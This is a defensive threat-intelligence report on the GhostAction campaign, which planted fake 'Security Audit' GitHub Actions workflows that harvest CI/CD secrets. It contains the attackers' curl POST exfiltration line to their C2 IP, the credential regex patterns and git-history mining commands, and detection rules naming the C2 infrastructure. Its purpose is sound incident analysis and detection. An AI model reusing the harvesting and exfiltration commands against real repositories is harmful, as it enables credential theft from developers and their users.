# Technical Analysis Report: GhostAction GitHub Credential Theft Campaign (2026-10-15)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-10-15
Version: 1.0

## Executive Summary

GhostAction is a persistent supply-chain campaign targeting GitHub developer infrastructure. Attackers use stolen Personal Access Tokens (PATs), likely sourced from infostealer logs and credential dumps, to inject malicious GitHub Actions workflow files into victim repositories. The campaign spiked on October 8-9, 2026, deploying credential-stealing workflows to over 30,000 repositories across approximately 1,900 compromised GitHub accounts. The malicious workflows masquerade as security audit tooling and exfiltrate CI/CD secrets, cloud credentials (AWS, GCP, Azure), package registry tokens (PyPI, npm, crates.io, DockerHub), AI provider API keys, and source-control tokens. Data is sent via plaintext HTTP POST to 193.32.204[.]199. GitHub began blocking the payload on October 9, but subsequent waves on October 10 and 12 used the same payload. The campaign has been active since September 2025, with the October 2026 burst representing its largest escalation. No malicious package releases using stolen publishing credentials have been observed yet, but the publishing tokens for major registries remain exposed until rotated.

## Background: GitHub Actions CI/CD Infrastructure

GitHub Actions is a CI/CD automation platform integrated into GitHub. Workflow files stored in `.github/workflows/` execute on hosted or self-hosted runners when triggered by repository events such as pushes or pull requests. Workflows have access to repository secrets (API keys, deployment tokens, credentials) configured by maintainers. A compromised GitHub credential with write access to a repository allows an attacker to commit workflow files directly to the default branch, bypassing code review. The workflows then execute automatically on subsequent pushes, enabling automated credential theft at scale. This attack does not exploit a vulnerability in GitHub Actions itself -- it abuses stolen maintainer credentials to plant malicious automation.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2025-09 | Original GhostAction wave: 817 repos, 327 users, 3,325 secrets stolen. Exfil via plesk[.]page subdomains and carte-avantage[.]com on 45.139.104[.]115. |
| 2025-10 to 2026-03 | Continued low-volume activity. Exfil endpoint shifts to 170.39.218[.]2 (~75 repos). |
| 2025-11, 2026-03-04 | Interactsh (*.oast[.]fun) used for testing/validation (~250 repos). |
| 2026-08-30 00:30 | Unrelated: XMRig cryptominer planted in kuafuai/DevOpsGPT Docker image. |
| 2026-08-31 | New GhostAction wave begins. Workflow `github_actions_security.yml` pushed to repositories. Exfil endpoint: 193.32.204[.]199 port 80. |
| 2026-09-07 | `security-check.yml` variant deployed to 7 repos, exfil to port 3000 path `/api/workflow/receive`. |
| 2026-09-15 | Four DevOpsGPT org repos targeted. |
| 2026-09-30 | Aug-Sept wave totals: 772 repos, 373 users/orgs, 2,577 secret names targeted. |
| 2026-10-08 12:26 | October burst begins. Payload v1 deployed, tag "(none)", 1,713 commits. |
| 2026-10-08 13:18 | Tag "bling", v1, 162 commits. |
| 2026-10-08 13:20-13:44 | Compromised account `kitao` pushes `security-audit.yml` to 27 repos including kitao/pyxel (18.4k stars). |
| 2026-10-08 13:31 | Tags "blingnew" (v1: 11, v2: 101 commits). |
| 2026-10-08 13:39 | Tag "monami", v3, 159 commits. |
| 2026-10-08 14:07 | Tag "new", v3, 29,431 commits -- the main burst. |
| 2026-10-08 21:10-21:26 | Compromised account `henrywoo` pushes to 318 repos (39 source + 279 forks), including uber/athenadriver. |
| 2026-10-09 | GitHub begins blocking the malicious workflow from executing. |
| 2026-10-10 13:45 | Tag "mnsft", v3, 84 commits -- blocked, no exfiltration. |
| 2026-10-12 10:20 | Tag "security", v3, 65 commits -- blocked, no exfiltration. |

## Root Cause: Stolen Personal Access Tokens (PATs)

Initial access is achieved through stolen GitHub Personal Access Tokens (PATs), sourced from infostealer malware logs and credential dumps on underground markets. The compromised credentials grant write access to the victim's repositories. The attackers then commit malicious workflow files directly to default branches under the victim's identity, without creating pull requests or triggering code review. The attack does not exploit any GitHub platform vulnerability. Multiple victim accounts (kitao, henrywoo, xxyangyoulin, and 500+ others per Socket) were reused across waves, indicating that credentials stolen in earlier campaigns were never rotated. Some victims from the September 2025 wave were re-compromised in October 2026.

## Technical Analysis of the Malicious Payload

### 1. Malicious Workflow Injection

The attacker pushes one of several workflow files to the victim's `.github/workflows/` directory on the default branch:

- **`security-audit.yml`** (October 2026 variant, name: "Security Audit")
- **`github_actions_security.yml`** (Aug-Sept 2026 variant, name: "Github Actions Security")
- **`security-check.yml`** (September 7 variant, name: "Security Check")

Commit messages used:
- "Add security audit workflow"
- "Update security audit workflow"
- "Add Github Actions Security workflow"
- "Update Github Actions Security workflow"
- "Add security check workflow"
- "Trigger security scan"

The workflows trigger on both `workflow_dispatch` (manual) and unfiltered `push` (any branch, any tag), ensuring execution on any subsequent repository activity.

### 2. Credential Harvesting Payload (October v3 -- Final Variant)

The workflow checks out the repository with `actions/checkout@v4` and `fetch-depth: 0` to obtain full git history across all branches and tags. A single shell step performs three collection passes:

**Pass 1 -- Named Actions Secrets:** Secret names found during prior reconnaissance of existing workflow files are rendered into the payload. For example, kitao/pyxel targeted `CARGO_REGISTRY_TOKEN`, `PERSONAL_ACCESS_TOKEN`, `PYPI_PASSWORD`, and `PYPI_USERNAME`.

**Pass 2 -- Working Tree Grep:** `grep -rEiho` with 13 credential patterns across the working tree (excluding `.git`):
- AWS: `AKIA[0-9A-Z]{16}`, `ASIA[0-9A-Z]{16}`, secret access key patterns, session tokens
- AI services: `sk-ant-...` (Anthropic), `sk-proj-...` (OpenAI), `sk-or-(v1-)?...` (OpenRouter)
- Source control: `ghp_[A-Za-z0-9]{36}` (GitHub classic PAT), `github_pat_` + 60 chars (fine-grained PAT), `glpat-...` (GitLab PAT)
- Cloud/SaaS: `AIza[A-Za-z0-9_-]{35}` (Google/Firebase), `xox[baprs]-...` (Slack), `SG\....\.....` (SendGrid)

**Pass 3 -- Git History Mining:** `git log -p --all` output (up to 200,000 lines) searched against the same 13 patterns, with up to 300 unique hits captured.

**AWS Context Capture:** `grep -B2 -A2` around AKIA/ASIA key IDs to pair access key IDs with their matching secret access keys (up to 150 lines).

Data is concatenated with body markers (`REPO=`, `AKIA_CTX_START`, `AKIA_CTX_END`) and every run returns a repository identifier even when no credentials are found, giving the operator a map of reachable repositories.

### 3. C2 Infrastructure

Exfiltration uses plaintext HTTP POST via curl:

```
curl -s -m 20 -X POST --data-binary @- "http://193.32.204[.]199/?c=<tag>" || true
```

| Period | Endpoint | Port | Notes |
|--------|----------|------|-------|
| Sept 2025 | bold-dhawan.45-139-104-115.plesk[.]page | 443 | Legacy |
| Sept 2025 | objective-hopper.45-139-104-115.plesk[.]page | 443 | Legacy |
| Sept 2025 | carte-avantage[.]com | 443 | Legacy |
| Oct-Dec 2025, Mar 2026 | 170.39.218[.]2 | - | ~75 repos |
| Nov 2025, Mar-Apr 2026 | *.oast[.]fun (Interactsh) | - | Testing, ~250 repos |
| Aug-Sept 2026 | 193.32.204[.]199 | 80 | Named secrets variant |
| Sept 2026 | 193.32.204[.]199 | 3000 | Path: /api/workflow/receive?inj=<id> |
| Oct 2026 | 193.32.204[.]199 | 80 | Path: /?c=<tag> (monami, new, bling, etc.) |

The use of direct IP over plaintext HTTP means no DNS query is generated and domain-based controls will miss exfiltration. The `|| true` suppresses curl errors to avoid workflow failure alerts.

### 4. Payload Version Evolution

| Version | New Capability | Wave |
|---------|---------------|------|
| v1 | 11 secret-detection regex patterns; working tree scan only | Aug-Sept 2026 |
| v2 | Case-insensitive matching; AWS key context capture (`grep -B2 -A2`) | Oct 8 2026 |
| v3 | Git history mining (`git log -p --all`, 200k line cap); context output limited to 150 lines | Oct 8 2026 |

### 5. Anti-Forensics / Evasion Techniques

- Workflow names mimic legitimate security tooling ("Security Audit", "Github Actions Security")
- Commits pushed directly to default branch under victim's identity, bypassing PR review
- `|| true` appended to curl to suppress error output and prevent workflow failure notifications
- `-s` (silent) flag on curl suppresses progress output
- `-m 20` timeout prevents hanging on network issues
- `CACHE_BUST=$(date +%s)` written to `GITHUB_ENV` in the legacy variant to defeat caching
- No DNS resolution (direct IP address) avoids DNS-based monitoring
- Plaintext HTTP avoids TLS inspection-based detection
- Each run returns the repo identifier even with no findings, functioning as reconnaissance

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxp://` (e.g., `hxxp://193.32.204[.]199/?c=new`)
> - IP addresses: `[.]` replacing dots (e.g., `193.32.204[.]199`)
> - Domains: `[.]` replacing dots (e.g., `carte-avantage[.]com`)

### Workflow / Repository Level

| Indicator | Type | Description |
|-----------|------|-------------|
| `.github/workflows/security-audit.yml` | File Path | October 2026 variant |
| `.github/workflows/github_actions_security.yml` | File Path | Aug-Sept 2026 variant |
| `.github/workflows/security-check.yml` | File Path | Sept 7 variant |
| "Security Audit" | Workflow Name | October variant `name:` field |
| "Github Actions Security" | Workflow Name | Legacy variant `name:` field |
| "Security Check" | Workflow Name | Sept 7 variant |
| "Add security audit workflow" | Commit Message | Injection commit |
| "Update security audit workflow" | Commit Message | Re-injection commit |
| "Add Github Actions Security workflow" | Commit Message | Legacy injection commit |
| "Update Github Actions Security workflow" | Commit Message | Legacy re-injection |
| "Add security check workflow" | Commit Message | Sept 7 variant |
| "Trigger security scan" | Commit Message | Re-trigger commit |

### Network

| Type | Value | Context |
|------|-------|---------|
| IP | 193.32.204[.]199 | Current C2 (Aug 2026 - present), ports 80 and 3000 |
| IP | 45.139.104[.]115 | Legacy C2 (Sept 2025) |
| IP | 170.39.218[.]2 | Intermediate C2 (Oct 2025 - Mar 2026) |
| Domain | bold-dhawan.45-139-104-115.plesk[.]page | Legacy exfil (Sept 2025) |
| Domain | objective-hopper.45-139-104-115.plesk[.]page | Legacy exfil (Sept 2025) |
| Domain | carte-avantage[.]com | Legacy exfil (Sept 2025) |
| URL Pattern | hxxp://193.32.204[.]199/?c=<tag> | Exfil path (Oct 2026). Tags: monami, new, bling, blingnew, mnsft, security |
| URL Pattern | hxxp://193.32.204[.]199:3000/api/workflow/receive?inj=<id> | Exfil path (Sept 2026) |

### Behavioral

| Indicator | Description |
|-----------|-------------|
| `REPO=` | Request body marker -- repo identifier in exfil payload |
| `AKIA_CTX_START` / `AKIA_CTX_END` | Request body markers -- AWS key context delimiters |
| `fetch-depth: 0` with `git log -p --all` | Full history checkout and mining |
| `grep -rEiho` with 13 credential patterns | Working tree credential sweep |
| `curl -s -m 20 -X POST --data-binary` to raw IP | Plaintext HTTP exfil to direct IP |
| Rapid-fire commits across many repos within minutes | Automated injection pattern |
| Workflow commits directly to default branch without PR | Bypass of code review |

### Compromised Accounts (Victims, Not Attacker-Owned)

| Account | Context |
|---------|---------|
| kitao (Takashi Kitao) | Author of pyxel (18.4k stars); pushed to 27 repos |
| henrywoo (Henry Wu) | Original author of Uber's athenadriver; pushed to 318 repos |
| xxyangyoulin | Identified in GitGuardian analysis |
| 500+ additional accounts | Per Socket analysis |

### Affected Repositories (Notable)

| Repository | Impact |
|------------|--------|
| uber/athenadriver | Exfiltration confirmed (run ID 37846728441) |
| kitao/pyxel | 18.4k stars; publishes to PyPI and crates.io |
| henrywoo/pyllama | 2.8k stars |
| henrywoo/chatllama | 1.2k stars |
| howie6879/liuli | Targeted |
| RSOLV-dev/rsolv-action | Targeted |
| typecho-fans/plugins | Infected Sept 5; re-trigger blocked by approval gate |

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1078.004 | Valid Accounts: Cloud Accounts | Stolen GitHub PATs used to authenticate and push malicious commits |
| T1195.002 | Supply Chain Compromise: Compromise Software Supply Chain | Malicious workflows planted in legitimate repositories to harvest credentials from CI/CD |
| T1552.001 | Unsecured Credentials: Credentials in Files | Regex scanning of working tree and git history for hardcoded secrets |
| T1552.004 | Unsecured Credentials: Private Keys | Targeting SSH keys and cloud credential files |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | Bash shell step executing grep and curl commands in workflow |
| T1041 | Exfiltration Over C2 Channel | Stolen credentials sent via HTTP POST to attacker-controlled IP |
| T1119 | Automated Collection | Automated scanning of 13 credential patterns across working tree and git history |
| T1071.001 | Application Layer Protocol: Web Protocols | HTTP POST used for exfiltration |
| T1588.002 | Obtain Capabilities: Tool | Use of infostealer logs to source initial GitHub credentials |

## Impact Assessment

- **Breadth:** ~1,900 compromised GitHub accounts, 30,000+ targeted repositories, 3,174 secret names targeted in the October wave alone. Total across all waves: 4,000+ repos, 2,000+ accounts.
- **Depth:** Stolen credentials include package registry publishing tokens (PyPI, npm, crates.io, DockerHub), cloud provider keys (AWS, GCP, Azure), and AI API keys. The exposure of publishing tokens means downstream supply-chain attacks via malicious package releases remain possible until tokens are rotated.
- **Stealth:** Workflows are designed to mimic security tooling, commits are attributed to legitimate maintainers, and no DNS queries are generated (direct IP exfil). Only 16% of affected repos (124 of 772 in the Aug-Sept wave) had been cleaned in public history as of Oct 5.
- **Persistence:** Victims from September 2025 were re-compromised in October 2026, indicating unrotated credentials and a persistent credential pool.

## Detection & Remediation

### Immediate Detection

Search your GitHub organization for the malicious workflow files:

```
# GitHub Code Search (github.com/search, Code tab)
"AKIA_CTX_START" path:.github/workflows
"c=monami" path:.github/workflows
"193.32.204.199" path:.github/workflows
org:YOUR-ORG "security-audit.yml" path:.github/workflows

# Search your local clones
find . -path '*/.github/workflows/security-audit.yml' -o -path '*/.github/workflows/github_actions_security.yml' -o -path '*/.github/workflows/security-check.yml'

# Check GitHub audit logs for injection patterns
# Look for: rapid-fire push events to .github/workflows/ across multiple repos from a single user
```

### Remediation

1. **Revoke compromised GitHub credentials:** Revoke all PATs, sessions, OAuth grants, and SSH keys for affected accounts. Re-enroll with phishing-resistant MFA.
2. **Remove malicious workflows:** Delete `security-audit.yml`, `github_actions_security.yml`, and `security-check.yml` from ALL branches, not just the default branch.
3. **Rotate ALL exposed secrets:** Rotate every secret that could have been in the repository's git history, not just current values. This includes AWS keys, PyPI/npm/crates.io tokens, DockerHub credentials, and AI API keys.
4. **Audit workflow runs:** Review GitHub Actions run logs since August 31, 2026 for the indicators above.
5. **Pause releases:** Treat all package registry tokens as exposed until rotated. Audit recent package releases for unauthorized versions.
6. **Check forks:** Forks of infected repos may inherit the malicious workflow. Enabling Actions on them can trigger execution.
7. **Block C2:** Block outbound connections to 193.32.204[.]199 from CI/CD runners, including self-hosted runners.

### Long-Term Hardening

- Enable GitHub secret scanning with push protection.
- Require PR review for all changes to `.github/workflows/` via branch protection rules or CODEOWNERS.
- Require approval for workflow runs from outside collaborators.
- Implement egress allowlisting on CI/CD runners (e.g., StepSecurity Harden-Runner `allowed-endpoints`) to catch raw-IP connections.
- Monitor for unsigned, rapid-fire commits across multiple repos from a single account.
- Rotate GitHub PATs regularly and use fine-grained PATs with minimal scope.

## Detection Rules

The following rules target the GhostAction campaign's known workflow patterns, network indicators, and payload markers. Rules cover GitHub audit log events (Sigma), workflow file content (YARA), and network exfiltration (Snort, Suricata). All rules use real (non-defanged) indicator values for detection accuracy per the logsource encoding reference.

### Sigma Rule 1: GhostAction Malicious Workflow Commit to GitHub Repository

Detects commits with known GhostAction commit messages pushing malicious workflow files to GitHub repositories, as observed in GitHub audit log events.

<!-- audit: Sigma rule targeting github audit log push events with known malicious commit messages. Logsource uses product:github, service:audit, matching against commit message patterns. No defanged values in detection fields. Validated with sigma check and sigma convert. -->

compile: see-validation | confidence: high

```yaml
title: GhostAction Malicious Workflow Commit Detected
id: 7e2f4a1b-9c3d-4b8e-a5f7-1d6e0c9b2a3f
status: experimental
description: >
    Detects push events to GitHub repositories with commit messages matching
    the GhostAction campaign's known injection patterns. The campaign uses
    stolen PATs to push malicious workflow files disguised as security tooling.
references:
    - https://blog.gitguardian.com/ghostaction-github-actions-supply-chain-attack-returns/
    - https://thehackernews.com/2026/10/ghostaction-compromises-about-1900.html
    - https://www.stepsecurity.io/blog/ghostaction-returns
author: Actioner
date: 2026-10-15
tags:
    - attack.t1195.002
    - attack.t1078.004
logsource:
    product: github
    service: audit
detection:
    selection_action:
        action: 'git.push'
    selection_message:
        commit_message|contains:
            - 'Add security audit workflow'
            - 'Update security audit workflow'
            - 'Add Github Actions Security workflow'
            - 'Update Github Actions Security workflow'
            - 'Add security check workflow'
            - 'Trigger security scan'
    condition: selection_action and selection_message
falsepositives:
    - Legitimate security tooling being added with similar commit messages
    - Internal security teams deploying audit workflows
level: high
```

### Sigma Rule 2: GhostAction HTTP Exfiltration to Known C2 IP

Detects outbound HTTP connections from CI/CD runners to the GhostAction C2 IP address 193.32.204.199 on ports 80 or 3000.

<!-- audit: Sigma rule targeting network/proxy logs for connections to the known GhostAction C2 IP. Uses proxy logsource category. Real IP values in detection (not defanged). Validated with sigma check and sigma convert. -->

compile: see-validation | confidence: high

```yaml
title: GhostAction HTTP Exfiltration to C2 IP 193.32.204.199
id: 3a8b5c7d-2e1f-4d9a-b6c8-0f3e7d5a1b2c
status: experimental
description: >
    Detects HTTP POST requests to the GhostAction C2 IP address
    193.32.204.199, used for exfiltrating stolen credentials from
    compromised GitHub Actions workflows since August 2026.
references:
    - https://blog.gitguardian.com/ghostaction-github-actions-supply-chain-attack-returns/
    - https://socket.dev/blog/ghostaction-cloud-credentials
    - https://www.stepsecurity.io/blog/ghostaction-returns
author: Actioner
date: 2026-10-15
tags:
    - attack.t1041
    - attack.t1071.001
logsource:
    category: proxy
detection:
    selection:
        dst_ip: '193.32.204.199'
        cs-method: 'POST'
    condition: selection
falsepositives:
    - Unlikely. Direct HTTP POST to this IP is highly indicative of GhostAction activity.
level: critical
```

### Sigma Rule 3: Suspicious GitHub Actions Workflow with Full Git History Checkout and Credential Grep

Detects behavioral patterns of the GhostAction payload in CI/CD execution logs: a workflow that checks out full git history and performs regex-based credential scanning.

<!-- audit: Sigma rule targeting process creation events on CI/CD runners for the GhostAction behavioral chain: fetch-depth 0 checkout followed by grep with credential patterns. Uses process_creation category. Validated with sigma check and sigma convert. -->

compile: see-validation | confidence: medium

```yaml
title: Suspicious Credential Scanning in CI/CD Pipeline
id: 9d4e6f2a-1b3c-4a5d-8e7f-0c9b2d1a3e4f
status: experimental
description: >
    Detects process execution patterns consistent with GhostAction credential
    harvesting in CI/CD environments. The malicious workflow greps for credential
    patterns in the working tree and git history, then exfiltrates via curl POST
    to a raw IP address.
references:
    - https://blog.gitguardian.com/ghostaction-github-actions-supply-chain-attack-returns/
    - https://socket.dev/blog/ghostaction-cloud-credentials
author: Actioner
date: 2026-10-15
tags:
    - attack.t1552.001
    - attack.t1119
logsource:
    category: process_creation
detection:
    selection_grep:
        CommandLine|contains|all:
            - 'grep'
            - '-rE'
            - 'AKIA'
    selection_gitlog:
        CommandLine|contains|all:
            - 'git'
            - 'log'
            - '-p'
            - '--all'
    selection_curl:
        CommandLine|contains|all:
            - 'curl'
            - 'POST'
            - '--data-binary'
    condition: selection_grep or (selection_gitlog and selection_curl)
falsepositives:
    - Legitimate secret scanning tools that grep for credential patterns
    - Security audit scripts performing git history analysis
level: high
```

### Sigma Rule 4: GhostAction Legacy C2 Communication

Detects network connections to legacy GhostAction C2 infrastructure including historical IPs and domains.

<!-- audit: Sigma rule targeting proxy/network logs for legacy GhostAction C2 destinations. Covers the September 2025 and interim endpoints. Real values in detection fields. Validated with sigma check and sigma convert. -->

compile: see-validation | confidence: high

```yaml
title: GhostAction Legacy C2 Infrastructure Communication
id: 5b7c9d1e-3a2f-4e6b-8d0c-2f1a4b5e7c8d
status: experimental
description: >
    Detects network connections to legacy GhostAction C2 infrastructure
    including the original September 2025 endpoints and intermediate IPs.
    These indicators remain relevant as the threat actor may reactivate
    old infrastructure.
references:
    - https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/
    - https://threats.wiz.io/all-incidents/ghostaction-campaign
author: Actioner
date: 2026-10-15
tags:
    - attack.t1041
    - attack.t1071.001
logsource:
    category: proxy
detection:
    selection_ip:
        dst_ip:
            - '45.139.104.115'
            - '170.39.218.2'
    selection_domain:
        r-dns|contains:
            - 'bold-dhawan.45-139-104-115.plesk.page'
            - 'objective-hopper.45-139-104-115.plesk.page'
            - 'carte-avantage.com'
    condition: selection_ip or selection_domain
falsepositives:
    - Unlikely. These IPs and domains are specifically associated with GhostAction C2.
level: high
```

### YARA Rule 1: GhostAction Security Audit Workflow

Detects the malicious GitHub Actions workflow files used by the GhostAction campaign based on characteristic string patterns found in the YAML payload.

<!-- audit: YARA rule matching GhostAction workflow YAML files by content patterns. Targets the unique combination of workflow name, fetch-depth 0, credential grep patterns, and curl exfil to raw IP. No PE header requirement since these are YAML files. Validated with yarac. -->

compile: see-validation | confidence: high

```yara
rule SupplyChain_GhostAction_Workflow_SecurityAudit
{
    meta:
        description = "Detects GhostAction malicious GitHub Actions workflow files that steal credentials from repositories"
        author = "Actioner"
        date = "2026-10-15"
        reference = "https://blog.gitguardian.com/ghostaction-github-actions-supply-chain-attack-returns/"
        severity = "critical"

    strings:
        $name1 = "Security Audit" ascii
        $name2 = "Github Actions Security" ascii
        $name3 = "Security Check" ascii

        $trigger1 = "workflow_dispatch" ascii
        $trigger2 = "push" ascii

        $checkout = "fetch-depth: 0" ascii

        $grep1 = "AKIA" ascii
        $grep2 = "ghp_" ascii
        $grep3 = "github_pat_" ascii
        $grep4 = "sk-ant-" ascii
        $grep5 = "sk-proj-" ascii
        $grep6 = "glpat-" ascii

        $exfil1 = "193.32.204.199" ascii
        $exfil2 = "curl" ascii
        $exfil3 = "--data-binary" ascii

        $marker1 = "AKIA_CTX_START" ascii
        $marker2 = "AKIA_CTX_END" ascii

        $gitlog = "git log -p --all" ascii

    condition:
        filesize < 50KB and
        1 of ($name*) and
        $trigger1 and
        (
            ($checkout and 2 of ($grep*)) or
            ($exfil1 and $exfil2) or
            (1 of ($marker*)) or
            ($gitlog and 1 of ($grep*))
        )
}
```

### YARA Rule 2: GhostAction Named Secrets Exfiltration Variant

Detects the legacy GhostAction workflow variant that directly exfiltrates named GitHub Actions secrets.

<!-- audit: YARA rule matching the named-secrets exfiltration variant of GhostAction. Targets the job name, cache busting technique, and secret posting behavior. Validated with yarac. -->

compile: see-validation | confidence: high

```yara
rule SupplyChain_GhostAction_Workflow_NamedSecrets
{
    meta:
        description = "Detects the GhostAction legacy workflow variant that posts named GitHub Actions secrets to attacker C2"
        author = "Actioner"
        date = "2026-10-15"
        reference = "https://blog.gitguardian.com/ghostaction-github-actions-supply-chain-attack-returns/"
        severity = "critical"

    strings:
        $job = "send-secrets" ascii
        $cache = "CACHE_BUST" ascii
        $env = "GITHUB_ENV" ascii
        $name = "Github Actions Security" ascii
        $ip1 = "193.32.204.199" ascii
        $ip2 = "45.139.104.115" ascii
        $curl = "curl" ascii
        $post = "POST" ascii
        $wf_dispatch = "workflow_dispatch" ascii

    condition:
        filesize < 50KB and
        (
            ($job and $curl and ($ip1 or $ip2)) or
            ($name and $cache and $env and $curl) or
            ($wf_dispatch and $job and $post)
        )
}
```

### YARA Rule 3: GhostAction Credential Pattern Scanner

Detects files containing the specific combination of credential regex patterns used by GhostAction for scanning working trees and git histories.

<!-- audit: YARA rule matching the credential pattern set used by GhostAction. The combination of these specific patterns in a single file is characteristic of the campaign. Validated with yarac. -->

compile: see-validation | confidence: medium

```yara
rule SupplyChain_GhostAction_CredentialPatterns
{
    meta:
        description = "Detects files containing the GhostAction credential scanning regex pattern set"
        author = "Actioner"
        date = "2026-10-15"
        reference = "https://socket.dev/blog/ghostaction-cloud-credentials"
        severity = "high"

    strings:
        $pat_aws_akia = "AKIA[0-9A-Z]{16}" ascii
        $pat_aws_asia = "ASIA[0-9A-Z]{16}" ascii
        $pat_anthropic = "sk-ant-" ascii
        $pat_openai = "sk-proj-" ascii
        $pat_openrouter = "sk-or-" ascii
        $pat_ghp = "ghp_[A-Za-z0-9]{36}" ascii
        $pat_ghpat = "github_pat_" ascii
        $pat_gitlab = "glpat-" ascii
        $pat_google = "AIza" ascii
        $pat_slack = "xox" ascii
        $pat_sendgrid = /SG\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/ ascii

        $tool_grep = "grep" ascii
        $tool_curl = "curl" ascii

    condition:
        filesize < 100KB and
        5 of ($pat_*) and
        $tool_grep and $tool_curl
}
```

### Snort Rule 1: GhostAction HTTP POST Exfiltration to C2

Detects HTTP POST requests to the primary GhostAction C2 IP address with characteristic payload markers.

<!-- audit: Snort 2 rule targeting HTTP POST to 193.32.204.199 with GhostAction body markers. Uses content match on the IP in the Host header and body content. Validated with snort -T. -->

compile: see-validation | confidence: high

```
alert tcp $HOME_NET any -> 193.32.204.199 any (msg:"Actioner - GhostAction HTTP POST Exfiltration to C2 193.32.204.199"; flow:established,to_server; content:"POST"; depth:4; content:"REPO="; sid:2100010; rev:1; classtype:trojan-activity; reference:url,blog.gitguardian.com/ghostaction-github-actions-supply-chain-attack-returns/;)
```

### Snort Rule 2: GhostAction AWS Context Marker in HTTP Traffic

Detects the AKIA_CTX_START marker in HTTP traffic, indicating exfiltration of AWS credential context by GhostAction.

<!-- audit: Snort 2 rule targeting the AKIA_CTX_START body marker in outbound HTTP traffic to any destination, providing broader detection than IP-specific rules. Validated with snort -T. -->

compile: see-validation | confidence: high

```
alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - GhostAction AWS Credential Context Exfiltration Marker"; flow:established,to_server; content:"POST"; depth:4; content:"AKIA_CTX_START"; sid:2100011; rev:1; classtype:trojan-activity; reference:url,blog.gitguardian.com/ghostaction-github-actions-supply-chain-attack-returns/;)
```

### Snort Rule 3: GhostAction Workflow Receive API Endpoint

Detects HTTP requests to the GhostAction /api/workflow/receive endpoint on port 3000.

<!-- audit: Snort 2 rule targeting the September 2026 variant's API endpoint. Validated with snort -T. -->

compile: see-validation | confidence: high

```
alert tcp $HOME_NET any -> 193.32.204.199 3000 (msg:"Actioner - GhostAction Workflow Receive API Endpoint"; flow:established,to_server; content:"/api/workflow/receive"; sid:2100012; rev:1; classtype:trojan-activity; reference:url,blog.gitguardian.com/ghostaction-github-actions-supply-chain-attack-returns/;)
```

### Suricata Rule 1: GhostAction HTTP POST to C2 with Query Parameter

Detects HTTP POST requests to the GhostAction C2 IP with the characteristic query parameter patterns.

<!-- audit: Suricata rule using http protocol with dot-notation sticky buffers. Targets POST method to the C2 IP with query patterns matching known GhostAction tags. Validated with suricata -T. -->

compile: see-validation | confidence: high

```
alert http $HOME_NET any -> 193.32.204.199 any (msg:"Actioner - GhostAction HTTP POST to C2 with Campaign Tag"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/?c="; sid:2100020; rev:1; classtype:trojan-activity; reference:url,blog.gitguardian.com/ghostaction-github-actions-supply-chain-attack-returns/;)
```

### Suricata Rule 2: GhostAction AKIA Context Exfiltration in HTTP Body

Detects the AKIA_CTX_START marker in HTTP request bodies, indicating GhostAction AWS credential exfiltration.

<!-- audit: Suricata rule using http.request_body sticky buffer to detect the AWS context marker. Broader than IP-specific rules. Validated with suricata -T. -->

compile: see-validation | confidence: high

```
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - GhostAction AWS Credential Context in HTTP Body"; flow:established,to_server; http.method; content:"POST"; http.request_body; content:"AKIA_CTX_START"; fast_pattern; sid:2100021; rev:1; classtype:trojan-activity; reference:url,blog.gitguardian.com/ghostaction-github-actions-supply-chain-attack-returns/;)
```

### Suricata Rule 3: GhostAction Legacy C2 Communication

Detects HTTP traffic to legacy GhostAction C2 IP addresses.

<!-- audit: Suricata rule targeting legacy C2 IPs from the 2025 campaign waves. Validated with suricata -T. -->

compile: see-validation | confidence: high

```
alert http $HOME_NET any -> [45.139.104.115,170.39.218.2] any (msg:"Actioner - GhostAction Legacy C2 IP Communication"; flow:established,to_server; sid:2100022; rev:1; classtype:trojan-activity; reference:url,threats.wiz.io/all-incidents/ghostaction-campaign;)
```

## Lessons Learned

1. **Credential rotation is critical after any breach.** The same victim accounts were re-compromised from September 2025 through October 2026 because PATs were never rotated. Secret rotation must include credentials buried in git history, not just current values.

2. **CI/CD workflow files are a high-value supply-chain target.** The ability to commit workflow files directly to default branches without PR review enabled automated, scaled credential theft. Branch protection and CODEOWNERS on `.github/workflows/` are essential controls.

3. **Plaintext HTTP to raw IPs evades common monitoring.** The use of direct IP addresses over HTTP avoids DNS-based detection and TLS inspection. CI/CD egress allowlisting is a necessary defense-in-depth control.

4. **Git history is a persistent credential exposure.** Secrets committed and later deleted remain in git history indefinitely. The GhostAction v3 payload specifically targets this by mining `git log -p --all`, recovering credentials that organizations believed were removed.

5. **Package registry tokens in CI/CD are the next supply-chain risk.** GhostAction harvested PyPI, npm, and crates.io publishing tokens but has not yet used them for malicious releases. The gap between credential theft and downstream exploitation may be a matter of time.

## Sources

- [GitGuardian Blog - GhostAction Returns](https://blog.gitguardian.com/ghostaction-github-actions-supply-chain-attack-returns/) -- Primary technical analysis with full timeline, payload versions, and IOCs
- [The Hacker News - GhostAction Compromises About 1,900 GitHub Accounts](https://thehackernews.com/2026/10/ghostaction-compromises-about-1900.html) -- Overview of the October 2026 spike with scale figures
- [The Hacker News - Credential-Stealing GitHub Actions](https://thehackernews.com/2026/10/credential-stealing-github-actions.html) -- Technical details on compromised accounts and workflow behavior
- [StepSecurity Blog - GhostAction Returns](https://www.stepsecurity.io/blog/ghostaction-returns) -- Detection guidance, hunting queries, and Harden-Runner telemetry
- [Socket Blog - GhostAction Cloud Credentials](https://socket.dev/blog/ghostaction-cloud-credentials) -- Analysis of credential patterns, affected repos, and exfiltration mechanics
- [GitGuardian Blog - Original GhostAction Campaign](https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/) -- 2025 campaign analysis with original IOCs
- [Wiz Threat Center - GhostAction Campaign](https://threats.wiz.io/all-incidents/ghostaction-campaign) -- Campaign overview with legacy infrastructure indicators

---
*Report generated by Actioner*
